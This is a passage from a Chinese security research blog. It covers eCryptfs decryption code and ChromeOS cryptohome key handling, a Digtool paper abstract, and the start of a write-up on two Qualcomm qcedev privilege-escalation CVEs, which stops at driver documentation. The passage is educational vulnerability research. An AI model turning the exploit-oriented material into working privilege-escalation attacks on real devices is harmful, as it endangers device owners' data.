<p>&emsp;  read过程指应用程序通过read()函数在eCryptfs挂载的目录下读取文件的过程。因为挂载点在挂载eCryptfs之前可能已经存在文件，这些已存在的文件属于非加密文件，只有在完成eCryptfs挂载后的文件才自动保存成eCryptfs格式的加密文件，所以读取文件时需要区分文件是否属于加密文件。从应用程序发起read()操作到eCryptfs层响应的函数调用关系流程图如十所示，读取时采用page read的机制，涉及到page cache的问题，图中以首次读取文件，即文件内容还没有被读取到page cache的情况为示例。自ecryptfs_read_update_atime()起进入到eCryptfs层，由此函数完成从底层文件系统中读取出文件内容，若是加密文件则利用kernel crypto和open时初始化好的ecryptfs_crypt_stat对象完成内容的解密，之后将解密后的文件内容拷贝到上层应用程序，同时更新文件的访问时间，其中touch_atime()完成文件的访问时间的更新；generic_file_read_iter()函数调用内核函数do_generic_file_read()，完成内存页的申请，并借助mapping-&gt;a_ops-&gt;readpage()调用真正干活的主力ecryptfs_readpage()来完成解密工作，最后通过copy_page_to_iter()将解密后的文件内容拷贝到应用程序。到了关键的解密阶段，描述再多也不如代码来的直观，ecryptfs_readpage()的核心代码如清单八、九、十所示。</p>
<center>          
![](ecryptfs-read.png "图十")   
图十 create经由VFS调用ecryptfs_create的流程
</center>

<h4 id="清单八-ecryptfs-readpage-关键代码"><a href="#清单八-ecryptfs-readpage-关键代码" class="headerlink" title="清单八 ecryptfs_readpage()关键代码"></a>清单八 ecryptfs_readpage()关键代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ecryptfs_readpage</span><span class="params">(struct file *file, struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_crypt_stat</span> *<span class="title">crypt_stat</span> =</span></span><br><span class="line"><span class="class">		&amp;<span class="title">ecryptfs_inode_to_private</span>(<span class="title">page</span>-&gt;<span class="title">mapping</span>-&gt;<span class="title">host</span>)-&gt;<span class="title">crypt_stat</span>;</span></span><br><span class="line">	<span class="keyword">int</span> rc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!crypt_stat || !(crypt_stat-&gt;flags &amp; ECRYPTFS_ENCRYPTED)) &#123;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//读取非加密文件</span></span><br><span class="line">		rc = ecryptfs_read_lower_page_segment(page, page-&gt;index, <span class="number">0</span>,</span><br><span class="line">						      PAGE_CACHE_SIZE,</span><br><span class="line">						      page-&gt;mapping-&gt;host);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (crypt_stat-&gt;flags &amp; ECRYPTFS_VIEW_AS_ENCRYPTED) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//直接读取密文给上层，此时应用程序读到的是一堆乱码</span></span><br><span class="line">		<span class="keyword">if</span> (crypt_stat-&gt;flags &amp; ECRYPTFS_METADATA_IN_XATTR) &#123;</span><br><span class="line">			rc = ecryptfs_copy_up_encrypted_with_header(page, crypt_stat);</span><br><span class="line">			…</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			rc = ecryptfs_read_lower_page_segment(</span><br><span class="line">				page, page-&gt;index, <span class="number">0</span>, PAGE_CACHE_SIZE,</span><br><span class="line">				page-&gt;mapping-&gt;host);</span><br><span class="line">			…</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//读取密文并调用kernel crypto解密</span></span><br><span class="line">		rc = ecryptfs_decrypt_page(page);</span><br><span class="line">		…</span><br><span class="line">	&#125;</span><br><span class="line">	…</span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="清单九-ecryptfs-decrypt-page-核心代码"><a href="#清单九-ecryptfs-decrypt-page-核心代码" class="headerlink" title="清单九 ecryptfs_decrypt_page()核心代码"></a>清单九 ecryptfs_decrypt_page()核心代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ecryptfs_decrypt_page</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	…</span><br><span class="line">	ecryptfs_inode = page-&gt;mapping-&gt;host;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//获取包含有FEK、cipher、crypto context tfm信息的ecryptfs_crypt_stat</span></span><br><span class="line">	crypt_stat = &amp;(ecryptfs_inode_to_private(ecryptfs_inode)-&gt;crypt_stat);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//计算加密文件内容在底层文件中的偏移</span></span><br><span class="line">	lower_offset = lower_offset_for_page(crypt_stat, page);</span><br><span class="line">	page_virt = kmap(page);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//利用底层文件系统的接口读取出加密文件的内容</span></span><br><span class="line">	rc = ecryptfs_read_lower(page_virt, lower_offset, PAGE_CACHE_SIZE, ecryptfs_inode);</span><br><span class="line">	kunmap(page);</span><br><span class="line">    …</span><br><span class="line">	<span class="keyword">for</span> (extent_offset = <span class="number">0</span>;</span><br><span class="line">	     extent_offset &lt; (PAGE_CACHE_SIZE / crypt_stat-&gt;extent_size);</span><br><span class="line">	     extent_offset++) &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//解密文件内容</span></span><br><span class="line">		rc = crypt_extent(crypt_stat, page, page,</span><br><span class="line">				  extent_offset, DECRYPT);</span><br><span class="line">		…</span><br><span class="line">	&#125;</span><br><span class="line">	…</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="清单十-crypt-extent-核心加解密函数的关键代码"><a href="#清单十-crypt-extent-核心加解密函数的关键代码" class="headerlink" title="清单十 crypt_extent()核心加解密函数的关键代码"></a>清单十 crypt_extent()核心加解密函数的关键代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">crypt_extent</span><span class="params">(struct ecryptfs_crypt_stat *crypt_stat,</span></span></span><br><span class="line"><span class="function"><span class="params">			struct page *dst_page,</span></span></span><br><span class="line"><span class="function"><span class="params">			struct page *src_page,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">unsigned</span> <span class="keyword">long</span> extent_offset, <span class="keyword">int</span> op)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//op 指示时利用该函数进行加密还是解密功能</span></span><br><span class="line">	<span class="keyword">pgoff_t</span> page_index = op == ENCRYPT ? src_page-&gt;index : dst_page-&gt;index;</span><br><span class="line">	<span class="keyword">loff_t</span> extent_base;</span><br><span class="line">	<span class="keyword">char</span> extent_iv[ECRYPTFS_MAX_IV_BYTES];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">src_sg</span>, <span class="title">dst_sg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> extent_size = crypt_stat-&gt;extent_size;</span><br><span class="line">	<span class="keyword">int</span> rc;</span><br><span class="line"></span><br><span class="line">	extent_base = (((<span class="keyword">loff_t</span>)page_index) * (PAGE_CACHE_SIZE / extent_size));</span><br><span class="line">	rc = ecryptfs_derive_iv(extent_iv, crypt_stat,</span><br><span class="line">				(extent_base + extent_offset));</span><br><span class="line">	…</span><br><span class="line">	sg_init_table(&amp;src_sg, <span class="number">1</span>);</span><br><span class="line">	sg_init_table(&amp;dst_sg, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	sg_set_page(&amp;src_sg, src_page, extent_size,</span><br><span class="line">		    extent_offset * extent_size);</span><br><span class="line">	sg_set_page(&amp;dst_sg, dst_page, extent_size,</span><br><span class="line">		    extent_offset * extent_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//调用kernel crypto API进行加解密</span></span><br><span class="line">	rc = crypt_scatterlist(crypt_stat, &amp;dst_sg, &amp;src_sg, extent_size, extent_iv, op);</span><br><span class="line">	…</span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;  理顺了mount、open的流程，知道FEK、cipher、kernel crypto context的值及存放位置，同时了解了加密文件的格式，解密的过程显得比较简单，感兴趣的同学可以继续查看crypt_scatterlist()的代码，该函数纯粹是调用kernel crypto API进行加解密的过程，跟eCryptfs已经没有关系。</p>
<h3 id="加密文件write过程-回页首"><a href="#加密文件write过程-回页首" class="headerlink" title="加密文件write过程 回页首"></a>加密文件write过程 <a href="#top">回页首</a></h3><p><span id="ecryptfs-file-write"></span></p>
<p>&emsp;  eCryptfs 文件write的流程跟read类似，在写入lower file前先通过ecryptfs_writepage()函数进行文件内容的加密，这里不再详述。</p>
<h2 id="ChromeOS使用eCryptfs的方法及流程-回页首"><a href="#ChromeOS使用eCryptfs的方法及流程-回页首" class="headerlink" title="ChromeOS使用eCryptfs的方法及流程 回页首"></a>ChromeOS使用eCryptfs的方法及流程 <a href="#top">回页首</a></h2><p><span id="ecryptfs-in-chromeos"></span></p>
<p>&emsp;  Chromeos在保护用户数据隐私方面可谓不遗余力，首先在系统分区上专门开辟出专用于存储用户数据的stateful partition，当用户进行正常和开发者模式切换时，该分区的数据将会被自动擦除；其次该stateful partition的绝大部分数据采用dm-crypt进行加密，在系统启动时用户登录前由mount-encrypted完成解密到/mnt/stateful_partition/encrypted，另外完成以下几个mount工作：将/Chromeos/mnt/stateful_partition/home bind mount 到/home；将/mnt/stateful_partition/encrypted/var bind mount到/var目录；将/mnt/stateful_partition/encrypted/chromos bind mount 到/home/chronos。最后在用户登录时发起对该用户私有数据的eCryptfs加解密的流程，具体工作由cryptohomed守护进程负责完成，eCryptfs加密文件存放在/home/.shadow/[salted_hash_of_username]/vault目录下，感兴趣的读者可通过ecryptfs-stat命令查看其文件状态和格式，mount点在/home/.shadow/[salted_hash_of_username]/mount，之后对/home/.shadow/[salted_hash_of_username]/mount下的user和root建立bind mount点，方便用户使用，如将/home/.shadow/[salted_hash_of_username]/mount/user bind mount到/home/user/[salted_hash_of_username]和/home/chronos/u-[salted_hash_of_username] ；将/home/.shadow/[salted_hash_of_username]/mount/root bind mount到/home/root/[salted_hash_of_username]。用户在存取数据时一般是对目录/home/chronos/u-[salted_hash_of_username]进行操作。<br>&emsp;  eCryptfs在Chromeos中的应用架构如图十所示。系统启动后开启cryptohomed的守护进程，由该进程来响应eCryptfs的挂载和卸载等，进程间采用D-Bus的方式进行通信，cryptohome应用程序主用于封装用户的动作命令，后通过D-Bus向cryptohomed发起请求。如可通过cryptohome命令”cryptohome -–action=mount -–user=[account_id]”来发起eCryptfs的挂载;通过命令”cryptohome -–action=unmount”卸载eCryptfs的挂载，执行成功此命令后，用户的所有个人数据将无法访问，如用户先前下载的文件内容不可见、安装的应用程序不可使用，/home/.shadow/[salted_hash_of_username]/mount内容为空。</p>
<center>          
![](ecryptfs-framework-in-chromeos.png "图十一")   
图十一 eCryptfs在Chromeos中的架构图
</center>

<p>&emsp;  cryptohomed特色的mount流程如下：     </p>
<ol>
<li>cryptohomed在D-Bus上接收到持（包含用户名和密码）有效用户证书的mount请求，当然D-Bus请求也是有权限控制的；     </li>
<li>假如是用户首次登陆，将进行：<br>a．    建立/home/.shadow/[salted_hash_of_username]目录，采用SHA1算法和系统的salt对用户名进行加密，生成salted_hash_of_username，简称s_h_o_u;<br>b．    生成vault keyset /home/.shadow/[salted_hash_of_username]/master.0和/home/.shadow/[salted_hash_of_username]/master.0.sum。 master.0加密存储了包含有FEK和FNEK的内容以及非敏感信息如salt、password rounds等；master.0.sum是对master.0文件内容的校验和。     </li>
<li>采用通过mount请求传入的用户证书解密keyset。当TPM可用时优先采用TPM解密，否则采用Scrypt库，当TPM可用后再自动切换回使用TPM。cryptohome使用TPM仅仅是为了存储密钥，由TPM封存的密钥仅能被TPM自身使用，这可用缓解密钥被暴力破解，增强保护用户隐私数据的安全。TPM的首次初始化由cryptohomed完成。这里默认TPM可正常使用，其解密机制如下图十二所示，其中：<br>UP：User Passkey，用户登录口令<br>EVKK：Ecrypted vault keyset key，保存在master.0中的”tpm_key”字段<br>IEVKK：Intermediate vault keyset key，解密过程生成的中间文件，属于EVKK的解密后产物，也是RSA解密的输入密文<br>TPM_CHK: TPM-wrapped system-wide Cryptohome key，保存在/home/.shadow/cryptohome.key，TPM init时加载到TPM<br>VKK：Vault keyset key<br>VK：Vault Keyset，包含FEK和FNEK<br>EVK：Encrypted vault keyset，保存在master.0里”wrapped_keyset”字段<br>图十二中的UP（由发起mount的D-Bus请求中通过key参数传入）做为一个AES key用于解密EVKK，解密后得到的IEVKK；然后将IEVKK做为RSA的密文送入TPM，使用TPM_CHK做为密钥进行解密，解密后得到VKK；最后生成的VKK是一个AES key，用于解密master.0里的EVK，得到包含有FEK和FNEK明文的VK。经过三层解密，终于拿到关键的FEK，那么问题来了，Chromeos的FEK的保存及解密流程与上文介绍的eCryptfs时不一致，FEK不应该是open时从加密文件的头部metadata里的EFEK中解密出来的么？不过一次解密出FEK，全局使用，效率的确比每次读取文件时解析FEK高很多，之后通过key的系统调用将key传入内核的keyring，使用时通过key sign匹配。最后跟上文所述实属异曲同工。     </li>
<li>通过mount系统调用传入option完成挂载。<br>该部分与正常的Linux做法一致，在mount的option里传入关键的cipher、key sign、key bytes等信息。</li>
</ol>
<center>          
![](TPM-decrypt-VK.png "图十二")   
图十二 TPM解密VK的流程
</center>

<h2 id="结语-回页首"><a href="#结语-回页首" class="headerlink" title="结语 回页首"></a>结语 <a href="#top">回页首</a></h2><p><span id="end"></span></p>
<p>&emsp;  ecryptfs建立在系统安全可信的基础上，保护用户数据的安全，核心基础组件是加密密钥，若在内核被攻破后密钥被通过某些手段窃取，ecryptfs的安全性将同样被攻破。另外page cache中加密文件的明文页有可能被交换到swap区，在chromeos中已经禁用了swap，因此不会产生影响，但是其他版本的Linux系统需要注意该问题。<br>&emsp;  eCryptfs首次实现到现在已经十年有余，直到近几年才在chromeos和Ubuntu上使用，个人认为除了之前人们的安全意识不如现在强烈外，更重要的是随着处理器性能的增强，eCryptfs加解密引起的文件读写性能下降的问题已经得到缓解。但实际的性能损耗如何，有待继续研究。或许出于性能的原因，年初的时候Google在chromeos实现了基于ext4 crypto的 dircrypto，用于实现跟eCryptfs同样的功能，目前chromeos同时支持eCryptfs和dircrypto，但在60版本后优先采用dircrypto技术，相关技术在另外的文章中进行介绍。<br>&emsp;  最后，文中必有未及细看而自以为是的东西，望大家能够去伪存真，更求不吝赐教。</p>
<h2 id="参考资料-回页首"><a href="#参考资料-回页首" class="headerlink" title="参考资料 回页首"></a>参考资料 <a href="#top">回页首</a></h2><p><span id="refer"></span></p>
<ol>
<li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-ecryptfs/" target="_blank" rel="noopener">企业级加密文件系统 eCryptfs 详解</a></li>
<li><a href="http://www.linuxjournal.com/article/9400" target="_blank" rel="noopener">eCryptfs: a Stacked Cryptographic Filesystem</a></li>
<li><a href="https://chromium.googlesource.com/chromiumos/third_party/kernel/+/v4.4.79" target="_blank" rel="noopener">Linux kernel-V4.4.79 sourcecode</a></li>
<li><a href="https://chromium.googlesource.com/chromiumos/" target="_blank" rel="noopener">chromiumos platform-9653 sourcecode</a></li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/10/ChromeOs-Userdata-Protection-Mechanism-Based-On-eCryptfs/" data-id="cmd5slqzw00050lo1fnt5gsxy" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2017/08/16/Digtool-A-Virtualization-Based-Framework-for-Detecting-Kernel-Vulnerabilities" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="../../2017/08/16/Digtool-A-Virtualization-Based-Framework-for-Detecting-Kernel-Vulnerabilities/" class="article-date">
  <time datetime="2017-08-16T07:53:40.000Z" itemprop="datePublished">2017-08-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="../../2017/08/16/Digtool-A-Virtualization-Based-Framework-for-Detecting-Kernel-Vulnerabilities/">Digtool - A Virtualization-Based Framework for Detecting Kernel Vulnerabilities</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author : Jianfeng Pan, Guanglu Yan, and Xiaocao Fan, IceSword Lab, 360 Internet Security Center</p>
<h2 id="Paper"><a href="#Paper" class="headerlink" title="Paper"></a>Paper</h2><p><a href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-pan.pdf" target="_blank"> https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-pan.pdf </a></p>
<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract:"></a>Abstract:</h2><p>Discovering vulnerabilities in operating system (OS) kernels and patching them is crucial for OS security. However, there is a lack of effective kernel vulnerability detection tools, especially for closed-source OSes such as Microsoft Windows. In this paper, we present Digtool, an effective, binary-code-only, kernel vulnerability detection framework. Built atop a virtualization monitor we designed, Digtool successfully captures various dynamic behaviors of kernel execution, such as kernel object allocation, kernel memory access, thread scheduling, and function invoking. With these behaviors, Digtool has identified 45 zero-day vulnerabilities such as out-of-bounds access, use-after-free, and time-of-check-to-time- of-use among both kernel code and device drivers of recent versions of MicrosoftWindows, includingWindows 7 and Windows 10.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/08/16/Digtool-A-Virtualization-Based-Framework-for-Detecting-Kernel-Vulnerabilities/" data-id="cmd5slr26000a0lo160z40hcg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="../../2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/" class="article-date">
  <time datetime="2017-08-07T00:00:00.000Z" itemprop="datePublished">2017-08-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="../../2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/">高通加解密引擎提权漏洞解析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author : <a href="https://twitter.comengjia4574" target="_blank">jiayy(@chengjia4574)</a>  from  IceSword Lab , Qihoo 360</p>
<hr>
<p><span id="top"></span></p>
<ul>
<li><a href="#before">前言</a></li>
<li><a href="#backgroud">背景知识</a></li>
<li><a href="#cause">漏洞成因</a><ul>
<li><a href="#CVE-2016-6738-cause">CVE-2016-6738 漏洞成因</a></li>
<li><a href="#CVE-2016-6738-patch">CVE-2016-6738 漏洞补丁</a></li>
<li><a href="#CVE-2016-3935-cause">CVE-2016-3935 漏洞成因</a></li>
<li><a href="#CVE-2016-3935-patch">CVE-2016-3935 漏洞补丁</a></li>
</ul>
</li>
<li><a href="#exp">漏洞利用</a><ul>
<li><a href="#what-is-kernel-exp">什么是提权</a></li>
<li><a href="#android-kernel-exp">利用方法回顾</a></li>
<li><a href="#this-kernel-exp">本文使用的方法</a></li>
<li><a href="#CVE-2016-6738-exp">CVE-2016-6738 漏洞利用</a></li>
<li><a href="#CVE-2016-3935-exp">CVE-2016-3935 漏洞利用</a></li>
</ul>
</li>
<li><a href="#refer">参考</a></li>
</ul>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言 [^]"></a>前言 <a href="#top">[^]</a></h2><p><span id="before"></span><br>CVE-2016-3935 和 CVE-2016-6738 是<a href="http://www.iceswordlab.com/" target="_blank" rel="noopener">我们</a>发现的高通加解密引擎（Qualcomm crypto engine）的两个提权漏洞，分别在2016年<a href="https://source.android.com/security/bulletin/2016-10-01" target="_blank" rel="noopener">10月</a>和<a href="https://source.android.com/security/bulletin/2016-11-01" target="_blank" rel="noopener">11月</a>的谷歌android漏洞榜被公开致谢，同时高通也在2016年<a href="https://www.codeaurora.org/failed-integer-overflow-check-leads-heap-overflow-driver-devqce-cve-2016-3901-cve-2016-3935" target="_blank" rel="noopener">10月</a>和<a href="https://www.codeaurora.org/user-controlled-arbitrary-kernel-address-write-qcedev-driver-cve-2016-6738" target="_blank" rel="noopener">11月</a>的漏洞公告里进行了介绍和公开致谢。这两个漏洞报告给谷歌的时候都提交了exploit并且被采纳，这篇文章介绍一下这两个漏洞的成因和利用。</p>
<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识 [^]"></a>背景知识 <a href="#top">[^]</a></h2><p><span id="backgroud"></span></p>
<p>高通芯片提供了硬件加解密功能，并提供驱动给内核态和用户态程序提供高速加解密服务，我们在这里收获了多个漏洞，主要有3个驱动</p>
<pre><code>- qcrypto driver:  供内核态程序使用的加解密接口 
- qcedev driver: 供用户态程序使用的加解密接口
- qce driver:  与加解密芯片交互，提供加解密驱动底层接口</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Documentation/crypto/msm/qce.txt</span><br><span class="line"></span><br><span class="line">  Linux kernel</span><br><span class="line">  (ex:IPSec)&lt;--*Qualcomm crypto driver----+</span><br><span class="line">                        (qcrypto)         |</span><br><span class="line">                   (<span class="keyword">for</span> kernel space app) |</span><br><span class="line">                                          |</span><br><span class="line">                                          +--&gt;|</span><br><span class="line">                                              |</span><br><span class="line">                                              | *qce   &lt;----&gt; Qualcomm</span><br><span class="line">                                              | driver        ADM driver &lt;---&gt; ADM HW</span><br><span class="line">                                          +--&gt;|                 |               |</span><br><span class="line">                                          |                     |               |</span><br><span class="line">                                          |                     |               |</span><br><span class="line">                                          |                     |               |</span><br><span class="line">   Linux kernel                           |                     |               |</span><br><span class="line">   misc device  &lt;--- *QCEDEV Driver-------+                     |               |</span><br><span class="line">   interface             (qcedev)                       (Reg interface)  (DMA interface)</span><br><span class="line">                        (<span class="keyword">for</span> user space app)                    \               /</span><br><span class="line">                                                                 \             /</span><br><span class="line">                                                                  \           /</span><br><span class="line">                                                                   \         /</span><br><span class="line">                                                                    \       /</span><br><span class="line">                                                                     \     /</span><br><span class="line">                                                                      \   /</span><br><span class="line">                                                                Qualcomm crypto CE3 HW</span><br></pre></td></tr></table></figure>

<p><a href="https://android.googlesource.com/kernel/msm.git/+/3f2bc4d6eb5a4fada842462ba22bb6bbb41d00c7/Documentation/crypto/msm/qcedev.txt" target="_blank" rel="noopener">qcedev driver</a> 就是本文两个漏洞发生的地方，这个驱动通过 ioctl 接口为用户层提供加解密和哈希运算服务。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Documentation/crypto/msm/qcedev.txt</span><br><span class="line"></span><br><span class="line">Cipher IOCTLs:</span><br><span class="line">  --------------</span><br><span class="line">    QCEDEV_IOCTL_ENC_REQ is <span class="keyword">for</span> encrypting data.</span><br><span class="line">    QCEDEV_IOCTL_DEC_REQ is <span class="keyword">for</span> decrypting data.</span><br><span class="line"></span><br><span class="line">        The <span class="built_in">caller</span> of the IOCTL passes a pointer to the structure shown</span><br><span class="line">        below, as the second parameter.</span><br><span class="line"></span><br><span class="line">        struct  qcedev_cipher_op_req &#123;</span><br><span class="line">                int                             use_pmem;</span><br><span class="line">                union&#123;</span><br><span class="line">                        struct qcedev_pmem_info pmem;</span><br><span class="line">                        struct qcedev_vbuf_info vbuf;</span><br><span class="line">                &#125;;</span><br><span class="line">                uint32_t                        entries;</span><br><span class="line">                uint32_t                        data_len;</span><br><span class="line">                uint8_t                         in_place_op;</span><br><span class="line">                uint8_t                         enckey[QCEDEV_MAX_KEY_SIZE];</span><br><span class="line">                uint32_t                        encklen;</span><br><span class="line">                uint8_t                         iv[QCEDEV_MAX_IV_SIZE];</span><br><span class="line">                uint32_t                        ivlen;</span><br><span class="line">                uint32_t                        byteoffset;</span><br><span class="line">                enum qcedev_cipher_alg_enum     alg;</span><br><span class="line">                enum qcedev_cipher_mode_enum    mode;</span><br><span class="line">                enum qcedev_oper_enum           op;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<p>加解密服务的核心结构体是 struct  qcedev_cipher_op_req, 其中, 待加/解密数据存放在 vbuf 变量里，enckey 是秘钥， alg 是算法，这个结构将控制内核qce引擎的加解密行为。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Documentation/crypto/msm/qcedev.txt</span><br><span class="line"></span><br><span class="line"> Hashing/HMAC IOCTLs</span><br><span class="line">  -------------------</span><br><span class="line"></span><br><span class="line">    QCEDEV_IOCTL_SHA_INIT_REQ is <span class="keyword">for</span> initializing a <span class="built_in">hash</span>/hmac request.</span><br><span class="line">    QCEDEV_IOCTL_SHA_UPDATE_REQ is <span class="keyword">for</span> updating <span class="built_in">hash</span>/hmac.</span><br><span class="line">    QCEDEV_IOCTL_SHA_FINAL_REQ is <span class="keyword">for</span> ending the <span class="built_in">hash</span>/mac request.</span><br><span class="line">    QCEDEV_IOCTL_GET_SHA_REQ is <span class="keyword">for</span> retrieving the <span class="built_in">hash</span>/hmac <span class="keyword">for</span> data</span><br><span class="line">        packet of known size.</span><br><span class="line">    QCEDEV_IOCTL_GET_CMAC_REQ is <span class="keyword">for</span> retrieving the MAC (using AES CMAC</span><br><span class="line">        algorithm) <span class="keyword">for</span> data packet of known size.</span><br><span class="line"></span><br><span class="line">        The <span class="built_in">caller</span> of the IOCTL passes a pointer to the structure shown</span><br><span class="line">        below, as the second parameter.</span><br><span class="line"></span><br><span class="line">        struct  qcedev_sha_op_req &#123;</span><br><span class="line">                struct buf_info                 data[QCEDEV_MAX_BUFFERS];</span><br><span class="line">                uint32_t                        entries;</span><br><span class="line">                uint32_t                        data_len;</span><br><span class="line">                uint8_t                         